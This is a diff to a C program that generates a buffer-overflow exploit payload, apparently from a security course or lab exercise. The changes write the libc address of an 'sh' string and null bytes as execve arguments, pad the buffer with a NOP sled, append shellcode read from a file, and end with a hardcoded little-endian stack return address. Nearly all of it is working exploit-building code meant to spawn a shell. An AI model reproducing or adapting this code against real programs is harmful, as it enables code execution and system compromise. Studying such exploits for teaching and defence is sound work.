@@ -17,14 +17,23 @@ int main(int argc, char *argv[]){
   int fileSize;
   int i;
   char ch = 0x90;
+  char nul = 0x00;
   char input;
   int numChars;
   unsigned char *instFile;
   unsigned char *addr = malloc(10);
+  unsigned char *shAddr = malloc(8);
 
   //strcpy(addr, "0x7fffffffdc30");
 
-  strcpy(addr, "0x7fffffffdca0");
+ 
+  shAddr = littleEndian("0x7ffff7b99678", 8);
+
+
+
+
+  printf("\n");
+  strcpy(addr, "0x7fffffffdcb0");
   //BELOW ADDRESS WORKS
   //strcpy(addr, "0x7fffffffdce0");
 
@@ -39,18 +48,12 @@ int main(int argc, char *argv[]){
   }
 
   instFile = argv[1];
-  numChars = atoi(argv[2]) + 8; //add 8 bytes for fp
-  //addr = argv[3];
+  numChars = atoi(argv[2]) - 8; //subtract 8 bytes as we are putting 16 bytes of arguments at beginning of buffer
   
-  /*
-  if(strlen(instructions) > numChars){
-    printf("Instructions length exceeds length of buffer.");
-    exit(1);
-  }
-  */
 
   instFp = fopen(instFile, "rb");
 
+  
   if(file == NULL){
     printf("Error opening file. Exiting.");
     exit(1);
@@ -61,23 +64,31 @@ int main(int argc, char *argv[]){
     exit(1);
   }
 
+  //find out how many characters are in instruction file
   fseek(instFp, 0L, SEEK_END);
   fileSize = ftell(instFp);
   rewind(instFp);
-
-  printf("%d %d\n", fileSize, numChars);
-
+  
+  //exit if we can't fit instructions in buffer
   if(fileSize > numChars){
     printf("Instruction set size cannot exceed number of characters in buffer.");
     exit(1);
   }
   
-  //fread(instructions, sizeof(char), fileSize, instFp);
+  //write address of 'sh' in libc memory to file first
+  for(i = 0; i < 8; i++){
+    fwrite(shAddr+i, 1, 1, file);    
+  }
 
+  //write 8 null characters to signify end of args for execve
+  for(i = 0; i < 8; i++){
+    fwrite(&nul, 1, 1, file);
+  }
+
+  //write nop sled up to number of characters
   for(i = fileSize; i < numChars; i++){
     fwrite(&ch, 1, 1, file);
-  }
-    
+  } 
   
   int j = 0;
   while(j < fileSize){
@@ -89,8 +100,6 @@ int main(int argc, char *argv[]){
   //fwrite(instructions, sizeof(char), fileSize, file);
      
   /* fill buffer */
-
-
 
   //-2 for the 0x at the start of the string
   byteAddr = littleEndian(addr, strlen(addr) - 2);
